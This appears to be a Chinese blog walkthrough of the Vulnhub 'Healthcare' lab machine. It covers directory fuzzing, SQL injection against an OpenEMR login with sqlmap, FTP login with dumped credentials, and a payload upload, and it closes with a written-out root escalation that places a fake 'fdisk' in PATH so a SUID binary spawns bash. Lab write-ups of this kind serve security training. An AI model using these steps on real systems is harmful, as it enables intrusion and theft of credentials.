---
title: Healthcare
date: 2021-12-26 16:02:24
tags: Vulnhub
categories: SQL注入漏洞
---

## 信息收集
发现目标主机开放了ftp和web服务，并且扫描出了不允许访问的几个目录
![在这里插入图片描述](https://img-blog.csdnimg.cn/5dbfa03fea4c49f1a2b08c27a605fbcc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们分别访问这几个目录，发现只有一个目录可以正常访问，其他目录都显示404状态码
![在这里插入图片描述](https://img-blog.csdnimg.cn/856663a863cd441ca9ca6d8e62e83129.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/d0a8cae2057141059254c7688269f92c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们没发现任何有价值的信息，那么就fuzz一下路径吧，发现存在一个openemr路径，进入后发现是后台登录页面

```
gobuster dir -u "http://192.168.101.200" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e 404,403,500
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/62eb523aa913490cb9772221e6da1687.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/ffb2f3248388447cbbbb28ff1fe1f4fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
看到post表单，条件反射验证是够存在SQL注入漏洞，使用burpsuite抓包并使用sqlmap进行注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/9fc387f225fb434d9189cf499ec9fd96.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们对数据库进行注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/b71794267f1340b2bd79b21e04a19913.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
查看存在users表
![在这里插入图片描述](https://img-blog.csdnimg.cn/786a517b4ae94a70998658329530e0ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16)
发现users表里存在username和password两个字段
![在这里插入图片描述](https://img-blog.csdnimg.cn/3ad57acd36ea44a6965f90f1200a4b83.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16)
注入发现了两个用户名和密码，我们分别尝试登录ftp，发现使用medical账号可以登录成功
![在这里插入图片描述](https://img-blog.csdnimg.cn/5f4e0f07bb7540f4b112b1c1d3b46062.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/d996972aacfe4e6f8988bca089b13a40.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们将payload上传到`/var/www/html/openemr`目录中，并进行访问
![在这里插入图片描述](https://img-blog.csdnimg.cn/8b9e1beafa41414a8d24428ffd10e758.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们切换到medical用户上，并查找可以执行的二进制文件`find / -perm -4000 2>/dev/null`
![在这里插入图片描述](https://img-blog.csdnimg.cn/38be5967b2204505b7abd5d0fbb30704.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们发现`/usr/bin/healthcheck`文件是比较容易受到攻击的程序，它只是运行了一堆标准的linux程序，比较明显的是`fdisk -l`这个程序
![在这里插入图片描述](https://img-blog.csdnimg.cn/53728f3d36a841d1a02a990f9a6c58c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们输入以下常见的提权操作，先将/bin/bash命令写入到fdisk程序中，并将其导入到medical用户的执行路径中，添加执行权限并拿取root权限

```
echo "/bin/bash" > fdisk
chmod +x fdisk
export PATH=/home/medical:$PATH
echo $PATH
/usr/bin/healthcheck
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/cda20fb3c5914ceaa4d13a6d3a7adf62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
